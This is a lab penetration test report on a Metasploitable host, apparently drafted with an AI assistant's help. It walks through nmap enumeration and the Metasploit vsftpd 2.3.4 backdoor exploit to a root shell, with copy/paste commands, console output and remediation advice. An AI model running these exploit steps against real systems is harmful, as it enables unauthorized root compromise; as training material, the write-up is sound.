# Penetration Test Report — Quick Engagement

**Date:** 2025-10-18
**Author:** Aman Jiwani (intern)
**Target / Lab:** Metasploitable (192.168.56.104)
**Scope:** Single-host lab exercise — discover open services and exploit a known backdoor in vsftpd 2.3.4.

---

## Executive summary

A short, focused test was performed against the target host `192.168.56.104`. Open ports and service versions were enumerated using `nmap`. The target was found to be running `vsftpd 2.3.4` (a version with a historically known backdoor). Using Metasploit, the `vsftpd_234_backdoor` exploit was launched, a shell was obtained, and limited post-exploitation commands were executed to validate access (e.g., `whoami`, `pwd`, `ifconfig`). The exploit resulted in a root shell on the host.

**Impact:** Complete system compromise (root) in the lab environment.

**Recommendation (summary):** Immediately upgrade/remove vulnerable vsftpd versions, disable anonymous or untrusted FTP access, apply least privilege and network segmentation, and monitor/alert for suspicious FTP/banner anomalies.

---

## Methodology

Following a standard pentest workflow:

1. **Reconnaissance** — gather host information (IP, up status).
2. **Scanning & Enumeration** — identify open ports and service versions (nmap).
3. **Exploitation** — choose a matching exploit (Metasploit), configure and run it.
4. **Post‑Exploitation** — confirm access and collect evidence (whoami, pwd, ifconfig).
5. **Reporting** — document findings and remediation.

---

## Tools used

* `nmap` — port & service/version detection
* `msfconsole` (Metasploit Framework) — search and run exploit
* Standard shell commands on compromised host: `whoami`, `pwd`, `ifconfig`

---

## 1) Reconnaissance

**Goal:** Identify live hosts and basic reachability.

Example command used (if performed):

```bash
# ping sweep (example)
ping -c 2 192.168.56.104
```

*Result:* Host `192.168.56.104` reachable on the lab network.

---

## 2) Scanning & Enumeration

**Goal:** Discover open TCP ports and service versions.

Command used:

```bash
nmap -sV -p- 192.168.56.104
```

Key finding (abbreviated):

* Port 21/tcp open — `vsFTPd 2.3.4` (banner shown)

This version is known to have an infamous backdoor implant (historical Metasploit module available).

---

## 3) Exploitation

**Goal:** Use a public exploit that targets `vsftpd 2.3.4` to obtain code execution.

**Metasploit session (relevant commands & output):**

```text
┌──(kali㉿kali)-[~]
└─$ msfconsole
... (banner truncated) ...

msf > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

msf > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CHOST                     no        The local client address
   CPORT                     no        The local client port
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]. Supported proxies: sapni, socks4, socks5, http, socks5h
   RHOSTS                    yes       The target host(s)
   RPORT    21               yes       The target port (TCP)

msf exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.104
RHOSTS => 192.168.56.104
msf exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 192.168.56.104:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.104:21 - USER: 331 Please specify the password.
[+] 192.168.56.104:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.104:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.105:38181 -> 192.168.56.104:6200) at 2025-10-18 05:49:58 -0400
```

**Interpretation:** Exploit successfully triggered the backdoor and spawned an interactive command shell, which Metasploit routed to the attacker.

---

## 4) Post‑Exploitation

**Goal:** Validate privileges and collect minimal system information as proof-of-access.

Commands executed on the compromised host (evidence captured):

```text
whoami
# output:
root

pwd
# output:
/

ifconfig
# output (abbreviated):
eth0      Link encap:Ethernet  HWaddr 08:00:27:9e:69:23
          inet addr:192.168.56.104  Bcast:192.168.56.255  Mask:255.255.255.0
...
lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
```

**Result:** Confirmed `root` user shell and network interface details, proving full compromise within the lab.

---

## 5) Findings & Risk

### Finding: `vsftpd 2.3.4` with backdoor

* **Severity:** High / Critical (in lab environment resulted in root shell)
* **Evidence:** nmap banner, Metasploit module output, `whoami` showing `root`.
* **CVE / Notes:** This is a historically known backdoor/backdoor-enabled release — remove or update vsftpd to a supported, patched version. (If this were a real production host, treat as urgent.)

---

## Remediation & Mitigations

1. **Upgrade vsftpd** to a supported patched version immediately (or remove FTP service if not required).
2. **Block/limit FTP** access via firewall rules — restrict to trusted IPs only.
3. **Harden service configuration**: disable anonymous login, restrict user shell access, run with least privileges.
4. **Network segmentation**: Do not expose legacy/unpatched services to untrusted networks.
5. **Logging & Monitoring**: Alert on unusual FTP banner changes and on unexpected port 21 connections.
6. **Incident response**: If this were production, isolate the host, collect forensic artifacts, rebuild from trusted image, and rotate any credentials possibly exposed.

---

## Artifacts & Appendix

### Commands used (copy/paste)

```bash
# nmap service/version scan
nmap -sV -p- 192.168.56.104

# Metasploit:
msfconsole
search vsftpd 2.3.4
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.104
run
```

### Raw output (key excerpts)

(See exploitation and post-exploitation sections above for captured outputs.)

---

## Notes for the report owner

* This markdown is written as a concise, reproducible GitHub-friendly file. You can paste it into a `REPORT.md` or `README.md` in your repo.
* If you want, I can convert this into a fuller professional pentest report with screenshots, timestamps, and a CVE reference list.

---

*End of quick engagement report.*
